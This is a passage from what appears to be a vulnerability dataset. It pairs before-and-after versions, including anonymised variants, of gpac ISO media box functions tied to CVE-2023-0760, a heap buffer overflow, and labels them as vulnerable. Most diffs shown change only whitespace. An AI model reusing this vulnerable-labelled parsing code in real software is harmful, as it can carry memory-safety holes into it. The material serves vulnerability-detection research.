	if (VAR_5 == VAR_45 ) {
		if (gf_bs_available(VAR_1) < 16) {
			ERR_EXIT(VAR_25);
		}
		gf_bs_read_data(VAR_1, VAR_13, 16);
		VAR_7 += 16;
		VAR_6 = gf_isom_solve_uuid_box(VAR_13);
	}

	/* COMMENT_4 */
	if (VAR_9 == 1) {
		if (gf_bs_available(VAR_1) < 8) {
			ERR_EXIT(VAR_25);
		}
		VAR_9 = gf_bs_read_u64(VAR_1);
		VAR_7 += 8;
	}
	if (!VAR_19)
		GF_LOG(VAR_28, VAR_29, (""[iso file] Read Box type %s size ""VAR_46"" start ""VAR_46""\n"", gf_4cc_to_str(VAR_5), VAR_9,  VAR_10));

	if ( VAR_9 < VAR_7 ) {
		GF_LOG(VAR_30, VAR_29, (""[iso file] Box %s size ""VAR_46"" less than box header size %d\n"", gf_4cc_to_str(VAR_5), VAR_9, VAR_7));
		ERR_EXIT(VAR_47);
	}
	/* COMMENT_5 */
	if (VAR_4 && (VAR_4<VAR_9)) {
		GF_LOG(VAR_30, VAR_29, (""[iso file] Box %s size ""VAR_31"" is larger than remaining parent size ""VAR_31""\n"", gf_4cc_to_str(VAR_5), VAR_9, VAR_4 ));
		ERR_EXIT(VAR_47);
	}
	VAR_8 = 0;
	if ((VAR_2==VAR_48) && (VAR_5==VAR_49) ) {
		u64 VAR_50 = gf_bs_get_cookie(VAR_1);
		VAR_8 = VAR_5;
		if (VAR_50 & VAR_51)
			VAR_5 = VAR_52;
		else
			VAR_5 = VAR_53;

	}

	/* COMMENT_6 */
	if (VAR_2 && (VAR_2 == VAR_54)) {
		VAR_18 = gf_isom_box_new(VAR_55);
		if (!VAR_18) ERR_EXIT(VAR_42);
		((GF_TrackReferenceTypeBox*)VAR_18)->reference_type = VAR_5;
	} else if (VAR_2 && (VAR_2 == VAR_56)) {
		VAR_18 = gf_isom_box_new(VAR_57);
		if (!VAR_18) ERR_EXIT(VAR_42);
		((GF_ItemReferenceTypeBox*)VAR_18)->reference_type = VAR_5;
	} else if (VAR_2 && (VAR_2 == VAR_58)) {
		VAR_18 = gf_isom_box_new(VAR_59);
		if (!VAR_18) ERR_EXIT(VAR_42);
		((GF_TrackGroupTypeBox*)VAR_18)->group_type = VAR_5;
	} else if (VAR_2 && (VAR_2 == VAR_60)) {
		VAR_18 = gf_isom_box_new(VAR_61);
		if (!VAR_18) ERR_EXIT(VAR_42);
		((GF_EntityToGroupTypeBox*)VAR_18)->grouping_type = VAR_5;
	} else {
		/* COMMENT_7 */
		VAR_23 = VAR_22;
		VAR_18 = gf_isom_box_new_ex(VAR_6 ? VAR_6 : VAR_5, VAR_2, VAR_19, VAR_3);
		if (!VAR_18) ERR_EXIT(VAR_42);
	}

	/* COMMENT_8 */
	if (VAR_5==VAR_45 && !VAR_23) {
		memcpy(((GF_UUIDBox *)VAR_18)->uuid, VAR_13, 16);
		((GF_UUIDBox *)VAR_18)->internal_4cc = VAR_6;
	}

	if (!VAR_18->type) VAR_18->type = VAR_5;
	if (VAR_8)
		VAR_18->type = VAR_8;

	VAR_12 = gf_bs_available(VAR_1);
	if (VAR_9 - VAR_7 > VAR_12 ) {
		VAR_18->size = VAR_9 - VAR_7 - VAR_12;
		*VAR_0 = VAR_18;
		ERR_EXIT(VAR_25);
	}

	VAR_18->size = VAR_9 - VAR_7;

	VAR_14 = gf_isom_full_box_read(VAR_18, VAR_1);
	if (!VAR_14) VAR_14 = gf_isom_box_read(VAR_18, VAR_1);
	if (VAR_14) {
		if (gf_opts_get_bool(""core"", ""no-check""))
			VAR_14 = VAR_33;
	}
	VAR_18->size = VAR_9;
	VAR_12 = gf_bs_get_position(VAR_1);

	if (VAR_15) {
		gf_free(VAR_16);
		gf_bs_del(VAR_15);
		if (VAR_14) {
			gf_isom_box_del(VAR_18);
			*VAR_0 = NULL;
			return VAR_14;
		}
		/* COMMENT_9 */
		VAR_9 -= 8;
		/* COMMENT_10 */
		if (VAR_5==VAR_38) {
			((GF_MovieFragmentBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
		}
		/* COMMENT_11 */
		else if (VAR_5==VAR_39) {
			((GF_MovieBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
			((GF_MovieBox *)VAR_18)->file_offset = VAR_11;
		}
		/* COMMENT_12 */
		else if (VAR_5==VAR_40) {
			((GF_SegmentIndexBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
		}
		/* COMMENT_12 */
		else if (VAR_5==VAR_41) {
			((GF_SubsegmentIndexBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
		}
		VAR_18->internal_flags = VAR_62;
	}


	if (VAR_14 && (VAR_14 != VAR_25)) {
		gf_isom_box_del(VAR_18);
		*VAR_0 = NULL;
		if (VAR_3 && (VAR_14==VAR_32))
			VAR_14 = VAR_47;

		if (!VAR_19 && (VAR_14!=VAR_32)) {
			GF_LOG(VAR_30, VAR_29, (""[iso file] Read Box \""%s\"" (start ""VAR_31"") failed (%s) - skipping\n"", gf_4cc_to_str(VAR_5), VAR_10, gf_error_to_string(VAR_14)));
		}
		/* COMMENT_13 */
		return VAR_14;
	}

	if (VAR_12-VAR_10 > VAR_9) {
		if (!VAR_19) {
			GF_LOG(VAR_63, VAR_29, (""[iso file] Box \""%s\"" size ""VAR_31"" (start ""VAR_31"") invalid (read ""VAR_31"")\n"", gf_4cc_to_str(VAR_5), VAR_9, VAR_10, (VAR_12-VAR_10) ));
		}
		/* COMMENT_14 */
		gf_bs_seek(VAR_1, VAR_10+VAR_9);
	} else if (VAR_12-VAR_10 < VAR_9) {
		u32 VAR_64 = (u32) (VAR_9-(VAR_12-VAR_10));
		if (!VAR_19) {
			if ((VAR_64!=4) || gf_bs_peek_bits(VAR_1, 32, 0)) {
				GF_LOG(VAR_63, VAR_29, (""[iso file] Box \""%s\"" (start ""VAR_31"") has %u extra bytes\n"", gf_4cc_to_str(VAR_5), VAR_10, VAR_64));
				VAR_65 += VAR_64;
			}
		}
		gf_bs_skip_bytes(VAR_1, VAR_64);
	}
	*VAR_0 = VAR_18;

	return VAR_14;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_funcs.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -10,7 +10,7 @@
 	GF_Box *newBox;
 	Bool skip_logs = (gf_bs_get_cookie(bs) & GF_ISOM_BS_COOKIE_NO_LOGS ) ? GF_TRUE : GF_FALSE;
 	Bool is_special = GF_TRUE;
-	
+
 	if ((bs == NULL) || (outBox == NULL) ) return GF_BAD_PARAM;
 	*outBox = NULL;
 	if (gf_bs_available(bs) < 8) {","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/box_funcs.c,gf_isom_check_position,"void gf_isom_check_position(GF_Box *s, GF_Box *child, u32 *pos)
{
if (!s || !s->child_boxes || !child || !pos) return;
if (s->internal_flags & GF_ISOM_ORDER_FREEZE)
return;
s32 cur_pos = gf_list_find(s->child_boxes, child);
if (cur_pos < 0) return;
if (cur_pos != (s32) *pos) {
gf_list_del_item(s->child_boxes, child);
gf_list_insert(s->child_boxes, child, *pos);
}
(*pos)++;
}","void gf_isom_check_position(GF_Box *VAR_0, GF_Box *VAR_1, u32 *VAR_2)
{
if (!VAR_0 || !VAR_0->child_boxes || !VAR_1 || !VAR_2) return;
if (VAR_0->internal_flags & VAR_3)
return;
s32 VAR_4 = gf_list_find(VAR_0->child_boxes, VAR_1);
if (VAR_4 < 0) return;
if (VAR_4 != (s32) *VAR_2) {
gf_list_del_item(VAR_0->child_boxes, VAR_1);
gf_list_insert(VAR_0->child_boxes, VAR_1, *VAR_2);
}
(*VAR_2)++;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_funcs.c/vul/before/2.json,"void gf_isom_check_position(GF_Box *s, GF_Box *child, u32 *pos)
{
	if (!s || !s->child_boxes || !child || !pos) return;
	if (s->internal_flags & GF_ISOM_ORDER_FREEZE)
		return;

	s32 cur_pos = gf_list_find(s->child_boxes, child);

	//happens when partially cloning boxes
	if (cur_pos < 0) return;

	if (cur_pos != (s32) *pos) {
		gf_list_del_item(s->child_boxes, child);
		gf_list_insert(s->child_boxes, child, *pos);
	}
	(*pos)++;
}","void gf_isom_check_position(GF_Box *VAR_0, GF_Box *VAR_1, u32 *VAR_2)
{
	if (!VAR_0 || !VAR_0->child_boxes || !VAR_1 || !VAR_2) return;
	if (VAR_0->internal_flags & VAR_3)
		return;

	s32 VAR_4 = gf_list_find(VAR_0->child_boxes, VAR_1);

	/* COMMENT_0 */
	if (VAR_4 < 0) return;

	if (VAR_4 != (s32) *VAR_2) {
		gf_list_del_item(VAR_0->child_boxes, VAR_1);
		gf_list_insert(VAR_0->child_boxes, VAR_1, *VAR_2);
	}
	(*VAR_2)++;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_funcs.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -6,7 +6,7 @@
 
 	s32 cur_pos = gf_list_find(s->child_boxes, child);
 
-	//happens when partially cloning boxes 
+	//happens when partially cloning boxes
 	if (cur_pos < 0) return;
 
 	if (cur_pos != (s32) *pos) {","{'deleted_lines': ['\t//happens when partially cloning boxes '], 'added_lines': ['\t//happens when partially cloning boxes']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/box_funcs.c,gf_isom_box_write,"GF_EXPORT
GF_Err gf_isom_box_write(GF_Box *a, GF_BitStream *bs)
{
GF_Err e;
u64 pos = gf_bs_get_position(bs);
if (!a) return GF_BAD_PARAM;
if (!a->size) return GF_OK;
if (a->registry->disabled) {
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box %s disabled registry, skip write\n"", gf_4cc_to_str(a->type)));
return GF_OK;
}
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box %s size %d write\n"", gf_4cc_to_str(a->type), a->size));
e = gf_isom_box_write_listing(a, bs);
if (e) return e;
if (a->child_boxes) {
e = gf_isom_box_array_write(a, a->child_boxes, bs);
}
pos = gf_bs_get_position(bs) - pos;
if (pos != a->size) {
if (a->type != GF_ISOM_BOX_TYPE_MDAT) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box %s wrote ""LLU"" bytes but size is ""LLU""\n"", gf_4cc_to_str(a->type), pos, a->size ));
}
}
return e;
}","GF_EXPORT
VAR_0 gf_isom_box_write(GF_Box *VAR_1, GF_BitStream *VAR_2)
{
GF_Err VAR_3;
u64 VAR_4 = gf_bs_get_position(VAR_2);
if (!VAR_1) return VAR_5;
if (!VAR_1->size) return VAR_6;
if (VAR_1->registry->disabled) {
GF_LOG(VAR_7, VAR_8, (""[iso file] Box %s disabled registry, skip write\n"", gf_4cc_to_str(VAR_1->type)));
return VAR_6;
}
GF_LOG(VAR_7, VAR_8, (""[iso file] Box %s size %d write\n"", gf_4cc_to_str(VAR_1->type), VAR_1->size));
VAR_3 = gf_isom_box_write_listing(VAR_1, VAR_2);
if (VAR_3) return VAR_3;
if (VAR_1->child_boxes) {
VAR_3 = gf_isom_box_array_write(VAR_1, VAR_1->child_boxes, VAR_2);
}
VAR_4 = gf_bs_get_position(VAR_2) - VAR_4;
if (VAR_4 != VAR_1->size) {
if (VAR_1->type != VAR_9) {
GF_LOG(VAR_10, VAR_8, (""[iso file] Box %s wrote ""VAR_11"" bytes but size is ""VAR_11""\n"", gf_4cc_to_str(VAR_1->type), VAR_4, VAR_1->size ));
}
}
return VAR_3;
}",,"GF_EXPORT
GF_Err gf_isom_box_write(GF_Box *a, GF_BitStream *bs)
{
	GF_Err e;
	u64 pos = gf_bs_get_position(bs);
	if (!a) return GF_BAD_PARAM;
	//box has been disabled, do not write
	if (!a->size) return GF_OK;

	if (a->registry->disabled) {
		GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box %s disabled registry, skip write\n"", gf_4cc_to_str(a->type)));
		return GF_OK;
	}

	GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box %s size %d write\n"", gf_4cc_to_str(a->type), a->size));
	e = gf_isom_box_write_listing(a, bs);
	if (e) return e;
	if (a->child_boxes) {
		e = gf_isom_box_array_write(a, a->child_boxes, bs);
	}
	pos = gf_bs_get_position(bs) - pos;
	if (pos != a->size) {
		if (a->type != GF_ISOM_BOX_TYPE_MDAT) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box %s wrote ""LLU"" bytes but size is ""LLU""\n"", gf_4cc_to_str(a->type), pos, a->size ));
		}
	}
	return e;
}","GF_EXPORT
VAR_0 gf_isom_box_write(GF_Box *VAR_1, GF_BitStream *VAR_2)
{
	GF_Err VAR_3;
	u64 VAR_4 = gf_bs_get_position(VAR_2);
	if (!VAR_1) return VAR_5;
	/* COMMENT_0 */
	if (!VAR_1->size) return VAR_6;

	if (VAR_1->registry->disabled) {
		GF_LOG(VAR_7, VAR_8, (""[iso file] Box %s disabled registry, skip write\n"", gf_4cc_to_str(VAR_1->type)));
		return VAR_6;
	}

	GF_LOG(VAR_7, VAR_8, (""[iso file] Box %s size %d write\n"", gf_4cc_to_str(VAR_1->type), VAR_1->size));
	VAR_3 = gf_isom_box_write_listing(VAR_1, VAR_2);
	if (VAR_3) return VAR_3;
	if (VAR_1->child_boxes) {
		VAR_3 = gf_isom_box_array_write(VAR_1, VAR_1->child_boxes, VAR_2);
	}
	VAR_4 = gf_bs_get_position(VAR_2) - VAR_4;
	if (VAR_4 != VAR_1->size) {
		if (VAR_1->type != VAR_9) {
			GF_LOG(VAR_10, VAR_8, (""[iso file] Box %s wrote ""VAR_11"" bytes but size is ""VAR_11""\n"", gf_4cc_to_str(VAR_1->type), VAR_4, VAR_1->size ));
		}
	}
	return VAR_3;
}",,"--- func_before
+++ func_after
@@ -6,7 +6,7 @@
 	if (!a) return GF_BAD_PARAM;
 	//box has been disabled, do not write
 	if (!a->size) return GF_OK;
-	
+
 	if (a->registry->disabled) {
 		GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Box %s disabled registry, skip write\n"", gf_4cc_to_str(a->type)));
 		return GF_OK;","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/box_code_base.c,dac3_box_write,"GF_Err dac3_box_write(GF_Box *s, GF_BitStream *bs)
{
GF_Err e;
GF_AC3ConfigBox *ptr = (GF_AC3ConfigBox *)s;
if (ptr->cfg.is_ec3) s->type = GF_ISOM_BOX_TYPE_DEC3;
e = gf_isom_box_write_header(s, bs);
if (ptr->cfg.is_ec3) s->type = GF_ISOM_BOX_TYPE_DAC3;
if (e) return e;
e = gf_odf_ac3_cfg_write_bs(&ptr->cfg, bs);
if (e) return e;
if (ptr->cfg.atmos_ec3_ext || ptr->cfg.complexity_index_type) {
gf_bs_write_int(bs, 0, 7);
gf_bs_write_int(bs, ptr->cfg.atmos_ec3_ext, 1);
gf_bs_write_u8(bs, ptr->cfg.complexity_index_type);
}
return GF_OK;
}","GF_Err dac3_box_write(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
GF_Err VAR_2;
GF_AC3ConfigBox *VAR_3 = (GF_AC3ConfigBox *)VAR_0;
if (VAR_3->cfg.is_ec3) VAR_0->type = VAR_4;
VAR_2 = gf_isom_box_write_header(VAR_0, VAR_1);
if (VAR_3->cfg.is_ec3) VAR_0->type = VAR_5;
if (VAR_2) return VAR_2;
VAR_2 = gf_odf_ac3_cfg_write_bs(&VAR_3->cfg, VAR_1);
if (VAR_2) return VAR_2;
if (VAR_3->cfg.atmos_ec3_ext || VAR_3->cfg.complexity_index_type) {
gf_bs_write_int(VAR_1, 0, 7);
gf_bs_write_int(VAR_1, VAR_3->cfg.atmos_ec3_ext, 1);
gf_bs_write_u8(VAR_1, VAR_3->cfg.complexity_index_type);
}
return VAR_6;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_code_base.c/vul/before/1.json,"GF_Err dac3_box_write(GF_Box *s, GF_BitStream *bs)
{
	GF_Err e;
	GF_AC3ConfigBox *ptr = (GF_AC3ConfigBox *)s;

	if (ptr->cfg.is_ec3) s->type = GF_ISOM_BOX_TYPE_DEC3;
	e = gf_isom_box_write_header(s, bs);
	if (ptr->cfg.is_ec3) s->type = GF_ISOM_BOX_TYPE_DAC3;
	if (e) return e;

	e = gf_odf_ac3_cfg_write_bs(&ptr->cfg, bs);
	if (e) return e;

	if (ptr->cfg.atmos_ec3_ext || ptr->cfg.complexity_index_type) {
		gf_bs_write_int(bs, 0, 7);
		gf_bs_write_int(bs, ptr->cfg.atmos_ec3_ext, 1);
		gf_bs_write_u8(bs, ptr->cfg.complexity_index_type);
	}
	return GF_OK;
}","GF_Err dac3_box_write(GF_Box *VAR_0, GF_BitStream *VAR_1)
{
	GF_Err VAR_2;
	GF_AC3ConfigBox *VAR_3 = (GF_AC3ConfigBox *)VAR_0;

	if (VAR_3->cfg.is_ec3) VAR_0->type = VAR_4;
	VAR_2 = gf_isom_box_write_header(VAR_0, VAR_1);
	if (VAR_3->cfg.is_ec3) VAR_0->type = VAR_5;
	if (VAR_2) return VAR_2;

	VAR_2 = gf_odf_ac3_cfg_write_bs(&VAR_3->cfg, VAR_1);
	if (VAR_2) return VAR_2;

	if (VAR_3->cfg.atmos_ec3_ext || VAR_3->cfg.complexity_index_type) {
		gf_bs_write_int(VAR_1, 0, 7);
		gf_bs_write_int(VAR_1, VAR_3->cfg.atmos_ec3_ext, 1);
		gf_bs_write_u8(VAR_1, VAR_3->cfg.complexity_index_type);
	}
	return VAR_6;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_code_base.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -7,7 +7,7 @@
 	e = gf_isom_box_write_header(s, bs);
 	if (ptr->cfg.is_ec3) s->type = GF_ISOM_BOX_TYPE_DAC3;
 	if (e) return e;
-	
+
 	e = gf_odf_ac3_cfg_write_bs(&ptr->cfg, bs);
 	if (e) return e;
 ","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/box_code_base.c,sgpd_parse_entry,"static void *sgpd_parse_entry(u32 grouping_type, GF_BitStream *bs, s32 bytes_in_box, u32 entry_size, u32 *total_bytes)
{
Bool null_size_ok = GF_FALSE;
GF_DefaultSampleGroupDescriptionEntry *def_ptr;
switch (grouping_type) {
case GF_ISOM_SAMPLE_GROUP_ROLL:
case GF_ISOM_SAMPLE_GROUP_PROL:
{
GF_RollRecoveryEntry *ptr;
GF_SAFEALLOC(ptr, GF_RollRecoveryEntry);
if (!ptr) return NULL;
ptr->roll_distance = gf_bs_read_int(bs, 16);
*total_bytes = 2;
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_RAP:
{
GF_VisualRandomAccessEntry *ptr;
GF_SAFEALLOC(ptr, GF_VisualRandomAccessEntry);
if (!ptr) return NULL;
ptr->num_leading_samples_known = gf_bs_read_int(bs, 1);
ptr->num_leading_samples = gf_bs_read_int(bs, 7);
*total_bytes = 1;
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_SAP:
{
GF_SAPEntry *ptr;
GF_SAFEALLOC(ptr, GF_SAPEntry);
if (!ptr) return NULL;
ptr->dependent_flag = gf_bs_read_int(bs, 1);
gf_bs_read_int(bs, 3);
ptr->SAP_type = gf_bs_read_int(bs, 4);
*total_bytes = 1;
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_SYNC:
{
GF_SYNCEntry *ptr;
GF_SAFEALLOC(ptr, GF_SYNCEntry);
if (!ptr) return NULL;
gf_bs_read_int(bs, 2);
ptr->NALU_type = gf_bs_read_int(bs, 6);
*total_bytes = 1;
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_TELE:
{
GF_TemporalLevelEntry *ptr;
GF_SAFEALLOC(ptr, GF_TemporalLevelEntry);
if (!ptr) return NULL;
ptr->level_independently_decodable = gf_bs_read_int(bs, 1);
gf_bs_read_int(bs, 7);
*total_bytes = 1;
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_SEIG:
{
GF_CENCSampleEncryptionGroupEntry *ptr;
if (bytes_in_box<3) return NULL;
GF_SAFEALLOC(ptr, GF_CENCSampleEncryptionGroupEntry);
if (!ptr) return NULL;
Bool use_mkey = gf_bs_read_int(bs, 1);
gf_bs_read_int(bs, 7); ptr->crypt_byte_block = gf_bs_read_int(bs, 4);
ptr->skip_byte_block = gf_bs_read_int(bs, 4);
ptr->IsProtected = gf_bs_read_u8(bs);
bytes_in_box -= 3;
if (use_mkey) {
u64 pos = gf_bs_get_position(bs);
u32 i, count = gf_bs_read_u16(bs);
bytes_in_box -= 2;
if (bytes_in_box<0) {
gf_free(ptr);
return NULL;
}
for (i=0; i<count; i++) {
u8 ivsize = gf_bs_read_u8(bs);
gf_bs_skip_bytes(bs, 16);
bytes_in_box -= 17;
if (!ivsize) {
ivsize = gf_bs_read_u8(bs);
gf_bs_skip_bytes(bs, ivsize);
bytes_in_box -= 1 + ivsize;
}
if (bytes_in_box<0) {
gf_free(ptr);
return NULL;
}
}
ptr->key_info_size = 1 + (u32) (gf_bs_get_position(bs) - pos);
ptr->key_info = gf_malloc(sizeof(u8) * ptr->key_info_size);
if (!ptr->key_info) {
gf_free(ptr);
return NULL;
}
gf_bs_seek(bs, pos);
ptr->key_info[0] = 1;
gf_bs_read_data(bs, ptr->key_info + 1, ptr->key_info_size - 1);
*total_bytes = 3 + ptr->key_info_size - 1;
if (!gf_cenc_validate_key_info(ptr->key_info, ptr->key_info_size)) {
gf_free(ptr->key_info);
gf_free(ptr);
return NULL;
}
} else {
bin128 kid;
u8 const_iv_size = 0;
u8 iv_size = gf_bs_read_u8(bs);
gf_bs_read_data(bs, kid, 16);
bytes_in_box -= 17;
if (bytes_in_box<0) {
gf_free(ptr);
return NULL;
}
*total_bytes = 20;
if ((ptr->IsProtected == 1) && !iv_size) {
const_iv_size = gf_bs_read_u8(bs);
if ((const_iv_size != 8) && (const_iv_size != 16)) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] seig sample group have invalid constant_IV size\n""));
gf_free(ptr);
return NULL;
}
}
ptr->key_info_size = 20;
if (!iv_size && ptr->IsProtected) {
ptr->key_info_size += 1 + const_iv_size;
}
ptr->key_info = gf_malloc(sizeof(u8) * ptr->key_info_size);
if (!ptr->key_info) {
gf_free(ptr);
return NULL;
}
ptr->key_info[0] = 0;
ptr->key_info[1] = 0;
ptr->key_info[2] = 0;
ptr->key_info[3] = iv_size;
memcpy(ptr->key_info+4, kid, 16);
if (!iv_size && ptr->IsProtected) {
ptr->key_info[20] = const_iv_size;
gf_bs_read_data(bs, (char *)ptr->key_info+21, const_iv_size);
*total_bytes += 1 + const_iv_size;
}
}
if (!entry_size) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] seig sample group does not indicate entry size, deprecated in spec\n""));
}
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_OINF:
{
GF_OperatingPointsInformation *ptr = gf_isom_oinf_new_entry();
u32 s = (u32) gf_bs_get_position(bs);
gf_isom_oinf_read_entry(ptr, bs);
*total_bytes = (u32) gf_bs_get_position(bs) - s;
if (!entry_size) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] oinf sample group does not indicate entry size, deprecated in spec\n""));
}
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_LINF:
{
GF_LHVCLayerInformation *ptr = gf_isom_linf_new_entry();
u32 s = (u32) gf_bs_get_position(bs);
gf_isom_linf_read_entry(ptr, bs);
*total_bytes = (u32) gf_bs_get_position(bs) - s;
if (!entry_size) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] linf sample group does not indicate entry size, deprecated in spec\n""));
}
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_TRIF:
if (! entry_size) {
u32 flags = gf_bs_peek_bits(bs, 24, 0);
if (flags & 0x10000) entry_size=3;
else {
if (flags & 0x80000) entry_size=7;
else entry_size=11;
if (flags & 0x200000) {
u32 nb_entries = gf_bs_peek_bits(bs, 16, entry_size);
entry_size += 2 + 2*nb_entries;
}
}
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] trif sample group does not indicate entry size, deprecated in spec\n""));
}
break;
case GF_ISOM_SAMPLE_GROUP_NALM:
if (! entry_size) {
u64 start = gf_bs_get_position(bs);
Bool rle, large_size;
u32 entry_count;
gf_bs_read_int(bs, 6);
large_size = gf_bs_read_int(bs, 1);
rle = gf_bs_read_int(bs, 1);
entry_count = gf_bs_read_int(bs, large_size ? 16 : 8);
gf_bs_seek(bs, start);
entry_size = 1 + (large_size ? 2 : 1);
entry_size += entry_count * 2;
if (rle) entry_size += entry_count * (large_size ? 2 : 1);
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] nalm sample group does not indicate entry size, deprecated in spec\n""));
}
break;
case GF_ISOM_SAMPLE_GROUP_TSAS:
case GF_ISOM_SAMPLE_GROUP_STSA:
null_size_ok = GF_TRUE;
break;
case GF_ISOM_SAMPLE_GROUP_TSCL:
entry_size = 20;
break;
case GF_ISOM_SAMPLE_GROUP_LBLI:
entry_size = 2;
break;
case GF_ISOM_SAMPLE_GROUP_SPOR:
{
u32 i;
GF_SubpictureOrderEntry *ptr;
GF_SAFEALLOC(ptr, GF_SubpictureOrderEntry);
if (!ptr) return NULL;
ptr->subpic_id_info_flag = gf_bs_read_int(bs, 1);
ptr->num_subpic_ref_idx = gf_bs_read_int(bs, 15);
*total_bytes = 2;
ptr->subp_track_ref_idx = gf_malloc(sizeof(u16) * ptr->num_subpic_ref_idx);
if (!ptr->subp_track_ref_idx) {
gf_free(ptr);
return NULL;
}
for (i=0; i<ptr->num_subpic_ref_idx; i++) {
ptr->subp_track_ref_idx[i] = gf_bs_read_u16(bs);
*total_bytes += 2;
}
if (ptr->subpic_id_info_flag) {
ptr->spinfo.subpic_id_len_minus1 = gf_bs_read_int(bs, 4);
ptr->spinfo.subpic_id_bit_pos = gf_bs_read_int(bs, 12);
ptr->spinfo.start_code_emul_flag = gf_bs_read_int(bs, 1);
ptr->spinfo.pps_sps_subpic_id_flag = gf_bs_read_int(bs, 1);
if (ptr->spinfo.pps_sps_subpic_id_flag) {
ptr->spinfo.xps_id = gf_bs_read_int(bs, 6);
} else {
ptr->spinfo.xps_id = gf_bs_read_int(bs, 4);
gf_bs_read_int(bs, 2);
}
*total_bytes += 3;
}
return ptr;
}
case GF_ISOM_SAMPLE_GROUP_SULM:
{
u32 i;
GF_SubpictureLayoutMapEntry *ptr;
GF_SAFEALLOC(ptr, GF_SubpictureLayoutMapEntry);
if (!ptr) return NULL;
ptr->groupID_info_4cc = gf_bs_read_u32(bs);
ptr->nb_entries = 1 + gf_bs_read_u16(bs);
*total_bytes = 6;
ptr->groupIDs = gf_malloc(sizeof(u16) * ptr->nb_entries);
if (!ptr->groupIDs) {
gf_free(ptr);
return NULL;
}
for (i=0; i<ptr->nb_entries; i++) {
ptr->groupIDs[i] = gf_bs_read_u16(bs);
*total_bytes += 2;
}
return ptr;
}
default:
break;
}
if (!entry_size && !null_size_ok) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] %s sample group does not indicate entry size and is not implemented, cannot parse!\n"", gf_4cc_to_str( grouping_type) ));
return NULL;
}
GF_SAFEALLOC(def_ptr, GF_DefaultSampleGroupDescriptionEntry);
if (!def_ptr) return NULL;
if (entry_size) {
def_ptr->length = entry_size;
def_ptr->data = (u8 *) gf_malloc(sizeof(u8)*def_ptr->length);
if (!def_ptr->data) {
gf_free(def_ptr);
return NULL;
}
gf_bs_read_data(bs, (char *) def_ptr->data, def_ptr->length);
*total_bytes = entry_size;
}
return def_ptr;
